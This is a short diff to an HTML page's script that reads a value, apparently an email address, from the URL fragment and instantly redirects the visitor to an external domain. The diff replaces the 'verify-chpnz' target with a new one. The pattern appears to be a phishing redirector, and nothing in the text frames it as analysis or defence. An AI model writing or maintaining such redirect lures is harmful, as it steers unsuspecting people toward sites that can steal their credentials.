@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://verify-chpnz.chpnz.com/?";
+			window.location.href = "https://guides.lsaitaly.com/?";
 		}, 0);
 	</script>
 </html>
